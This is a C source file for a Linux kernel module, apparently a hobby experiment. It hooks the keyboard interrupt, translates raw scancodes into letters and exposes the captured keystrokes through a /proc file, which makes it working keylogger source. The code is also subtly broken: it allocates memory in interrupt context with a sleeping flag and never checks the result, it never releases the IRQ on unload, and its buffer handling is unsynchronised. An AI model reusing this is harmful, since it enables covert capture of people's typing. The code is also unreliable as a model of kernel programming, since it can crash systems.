#include <linux/kernel.h> /* We're doing kernel work */
#include <linux/module.h> /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h> /* We want an interrupt */
#include <linux/proc_fs.h>	/* Necessary because we use the proc fs */
#include <asm/io.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert W. Oliver II");
MODULE_DESCRIPTION("A simple example Linux module.");
MODULE_VERSION("0.01");



int my_init(void);
void my_exit(void);
char translate_scan_code(int);
ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp);
static void work_handler(struct work_struct *work);

/*
 * Work queue shit
 */
#define MY_WORK_QUEUE_NAME "Interceptor_Queue"

static struct workqueue_struct *my_workqueue;
 
struct interceptor_work_struct {
    struct work_struct work;
    unsigned char scancode;
};




/*
 * Interceptor buffer shit
 */
#define  INTERCEPTOR_BUFFER_LEN 1000
int len,temp;
char *msg;
static char interceptor_buffer[INTERCEPTOR_BUFFER_LEN];
// unsigned int current_buffer_start_index = 0;
unsigned int current_buffer_size = 0;




/*
 * /proc shit
 */
struct file_operations proc_fops = {
    read:   read_proc
};


// This is called when someone reads the proc file
/** @brief This function is called whenever device is being read from user space i.e. data is
 *  being sent from the device to the user. In this case is uses the copy_to_user() function to
 *  send the buffer string to the user and captures any errors.
 *  @param filep A pointer to a file object (defined in linux/fs.h)
 *  @param buffer The pointer to the buffer to which this function writes the data
 *  @param len Number of bytes attempted to be read
 *  @param offset Offset is where in the file is being read from
 */
ssize_t read_proc(struct file *filp,char *buf, size_t num_bytes_requested, loff_t *offp ) 
{
    printk("Count: %lu", num_bytes_requested);
    printk("Offset: %llu: ", *offp);
    unsigned int num_bytes_to_write = 0;

    if(num_bytes_requested < current_buffer_size)
    {
        num_bytes_to_write = num_bytes_requested;
    }
    else
    {
        num_bytes_to_write = current_buffer_size;
    }

    copy_to_user(buf, interceptor_buffer, num_bytes_to_write);

    current_buffer_size = 0; // We essentially flush the buffer on each read

    return num_bytes_to_write;
}




static void work_handler(struct work_struct *work_in)
{
    struct interceptor_work_struct* interceptor_work = (struct interceptor_work_struct *)work_in;
    printk("Worker called");

    // printk(KERN_INFO "Scan Code %x %s.\n",
    // (int)*((char *)scancode) & 0x7F,
    // *((char *)scancode) & 0x80 ? "Released" : "Pressed");

    unsigned char scancode = interceptor_work->scancode;
    char translated_character;

    printk("Worker handled scancode: %u", scancode);
    translated_character = translate_scan_code(scancode);
    printk("Translated scan code: %c", translated_character);

    if(current_buffer_size < INTERCEPTOR_BUFFER_LEN)
    {
        if(translated_character != 0)
        {
            interceptor_buffer[current_buffer_size] = translated_character;
            current_buffer_size++;
        }
    }
    else
    {
        printk("Flushing interceptor buffer!");
        current_buffer_size = 0;
        interceptor_buffer[current_buffer_size] = translated_character;
        current_buffer_size++;
    }

    kfree(interceptor_work);
}


irqreturn_t irq_handler(int irq, void *dev_id)
{
    static unsigned char scancode;
    unsigned char status;
    

    printk("Interrupt caught");

    /*
    * Read keyboard status
    */
    status = inb(0x64);
    scancode = inb(0x60);

    // Not sure if this is the best way to do this?
    struct interceptor_work_struct * interceptor_work;
    interceptor_work = kmalloc(sizeof(struct interceptor_work_struct), GFP_KERNEL);

    INIT_WORK(&interceptor_work->work, work_handler);

    interceptor_work->scancode = scancode;

    queue_work(my_workqueue, &interceptor_work->work);

    return IRQ_HANDLED;
}

/*
* Initialize the module - register the IRQ handler
*/
int my_init()
{
    my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);

    proc_create("hello",0,NULL,&proc_fops);
    
    // DISABLING FOR NOW
    // free_irq(1, NULL);
    return request_irq(1,           /* The number of the keyboard IRQ on PCs */
                       irq_handler, /* our handler */
                       IRQF_SHARED, "test_keyboard_irq_handler",
                       (void *)(irq_handler));
}

/*
* Cleanup
*/
void my_exit()
{
    /*
    * This is only here for completeness. It's totally irrelevant, since
    * we don't have a way to restore the normal keyboard interrupt so the
    * computer is completely useless and has to be rebooted.
    */
    // free_irq(1, NULL);

    remove_proc_entry("hello",NULL);

    return 0;
}

/*
* some work_queue related functions are just available to GPL licensed Modules
*/
MODULE_LICENSE("GPL");
module_init(my_init);
module_exit(my_exit);



char translate_scan_code(int scancode)
{
    switch(scancode)
    {
        case 16: return 'q';
        case 17: return 'w';
        case 18: return 'e';
        case 19: return 'r';
        case 20: return 't';
        case 21: return 'y';
        case 22: return 'u';
        case 23: return 'i';
        case 24: return 'o';
        case 25: return 'p';
        case 30: return 'a';
        case 31: return 's';
        case 32: return 'd';
        case 33: return 'f';
        case 34: return 'g';
        case 35: return 'h';
        case 36: return 'j';
        case 37: return 'k';
        case 38: return 'l';
        case 44: return 'z';
        case 45: return 'x';
        case 46: return 'c';
        case 47: return 'v';
        case 48: return 'b';
        case 49: return 'n';
        case 50: return 'm';
        default: return 0;
    }
}